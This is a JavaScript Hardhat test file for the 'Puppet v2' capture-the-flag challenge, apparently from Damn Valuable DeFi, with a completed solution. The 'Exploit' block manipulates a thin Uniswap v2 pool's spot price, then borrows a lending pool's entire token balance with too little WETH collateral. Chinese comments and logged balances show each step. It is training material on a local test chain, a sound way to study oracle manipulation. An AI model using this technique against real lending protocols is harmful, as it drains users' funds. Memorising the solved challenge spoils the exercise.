const pairJson = require('@uniswap/v2-core/build/UniswapV2Pair.json')
const factoryJson = require('@uniswap/v2-core/build/UniswapV2Factory.json')
const routerJson = require('@uniswap/v2-periphery/build/UniswapV2Router02.json')

const { ethers } = require('hardhat')
const { expect } = require('chai')

describe('[Challenge] Puppet v2', function () {
  let deployer, attacker

  // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
  const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('100')
  const UNISWAP_INITIAL_WETH_RESERVE = ethers.utils.parseEther('10')

  const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('10000')
  const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000000')

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners()

    await ethers.provider.send('hardhat_setBalance', [
      attacker.address,
      '0x1158e460913d00000' // 20 ETH
    ])
    expect(await ethers.provider.getBalance(attacker.address)).to.eq(ethers.utils.parseEther('20'))

    const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer)
    const UniswapRouterFactory = new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer)
    const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer)

    // Deploy tokens to be traded
    this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy()
    this.weth = await (await ethers.getContractFactory('WETH9', deployer)).deploy()

    // Deploy Uniswap Factory and Router
    this.uniswapFactory = await UniswapFactoryFactory.deploy(ethers.constants.AddressZero)
    this.uniswapRouter = await UniswapRouterFactory.deploy(
      this.uniswapFactory.address,
      this.weth.address
    )

    // Create Uniswap pair against WETH and add liquidity
    await this.token.approve(
      this.uniswapRouter.address,
      UNISWAP_INITIAL_TOKEN_RESERVE
    )
    await this.uniswapRouter.addLiquidityETH(
      this.token.address,
      UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
      0, // amountTokenMin
      0, // amountETHMin
      deployer.address, // to
      (await ethers.provider.getBlock('latest')).timestamp * 2, // deadline
      { value: UNISWAP_INITIAL_WETH_RESERVE }
    )
    this.uniswapExchange = await UniswapPairFactory.attach(
      await this.uniswapFactory.getPair(this.token.address, this.weth.address)
    )
    expect(await this.uniswapExchange.balanceOf(deployer.address)).to.be.gt('0')

    // Deploy the lending pool
    this.lendingPool = await (await ethers.getContractFactory('PuppetV2Pool', deployer)).deploy(
      this.weth.address,
      this.token.address,
      this.uniswapExchange.address,
      this.uniswapFactory.address
    )

    // Setup initial token balances of pool and attacker account
    await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE)
    await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE)

    // Ensure correct setup of pool.
    expect(
      await this.lendingPool.calculateDepositOfWETHRequired(ethers.utils.parseEther('1'))
    ).to.be.eq(ethers.utils.parseEther('0.3'))
    expect(
      await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
    ).to.be.eq(ethers.utils.parseEther('300000'))
  })

  it('Exploit', async function () {
    const printBalance = async () => {
      const attackerETHBalance = await ethers.provider.getBalance(attacker.address)
      const attackerWETHBalance = await this.weth.balanceOf(attacker.address)
      const attackerTokenBalance = await this.token.balanceOf(attacker.address)

      console.log('Attacker ETH: ', ethers.utils.formatEther(attackerETHBalance))
      console.log('Attacker WETH: ', ethers.utils.formatEther(attackerWETHBalance))
      console.log('Attacker DVT: ', ethers.utils.formatEther(attackerTokenBalance))

      const uniswapWETHBalance = await this.weth.balanceOf(this.uniswapExchange.address)
      const uniswapTokenBalance = await this.token.balanceOf(this.uniswapExchange.address)

      console.log('Uniswap WETH: ', ethers.utils.formatEther(uniswapWETHBalance))
      console.log('Uniswap DVT: ', ethers.utils.formatEther(uniswapTokenBalance))

      const lendingPoolDVTBalance = await this.token.balanceOf(this.lendingPool.address)
      console.log('LendingPool DVT: ', ethers.utils.formatEther(lendingPoolDVTBalance))

      const lendingPoolWETHBalance = await this.lendingPool.deposits(attacker.address)
      console.log('LendingPool ETH: ', ethers.utils.formatEther(lendingPoolWETHBalance))
    }
    const attackerCallLendingPool = this.lendingPool.connect(attacker)
    const attackerCallUniswap = this.uniswapRouter.connect(attacker)
    const attackerCallToken = this.token.connect(attacker)
    const attackerCallWETH = this.weth.connect(attacker)

    // init:
    // Attacker ETH:  20.0
    // Attacker WETH:  0.0
    // Attacker DVT:  10000.0
    // Uniswap WETH:  10.0
    // Uniswap DVT:  100.0
    // LendingPool DVT:  1000000.0

    // 授权 uniswap 支配 attacker 的 DVT token
    await attackerCallToken.approve(attackerCallUniswap.address, ATTACKER_INITIAL_TOKEN_BALANCE)

    // 在 uniswap 中使用 DVT 兑换 WETH
    await attackerCallUniswap.swapExactTokensForTokens(
      ATTACKER_INITIAL_TOKEN_BALANCE,
      ethers.utils.parseEther('9'),
      [attackerCallToken.address, attackerCallWETH.address],
      attacker.address,
      (await ethers.provider.getBlock('latest')).timestamp * 2
    )
    // Attacker ETH:  19.99975413442550073
    // Attacker WETH:  9.900695134061569016
    // Attacker DVT:  0.0
    // Uniswap WETH:  0.099304865938430984
    // Uniswap DVT:  10100.0
    // LendingPool DVT:  1000000.0

    // 计算需要抵押的 ETH 数量
    const collateralCount = await attackerCallLendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
    console.log('collateralCount: ', ethers.utils.formatEther(collateralCount))

    await attackerCallWETH.approve(attackerCallLendingPool.address, collateralCount)
    const tx = {
      to: attackerCallWETH.address,
      value: ethers.utils.parseEther('19.9')
    }
    await attacker.sendTransaction(tx)

    // 借出 DVT
    await attackerCallLendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE, {
      gasLimit: 1e6
    })

    // Attacker ETH:  0.099518462674923535
    // Attacker WETH:  0.304200300864247036
    // Attacker DVT:  1000000.0
    // Uniswap WETH:  0.099304865938430984
    // Uniswap DVT:  10100.0
    // LendingPool DVT:  0.0
    printBalance()
  })

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Attacker has taken all tokens from the pool
    expect(
      await this.token.balanceOf(this.lendingPool.address)
    ).to.be.eq('0')

    expect(
      await this.token.balanceOf(attacker.address)
    ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE)
  })
})
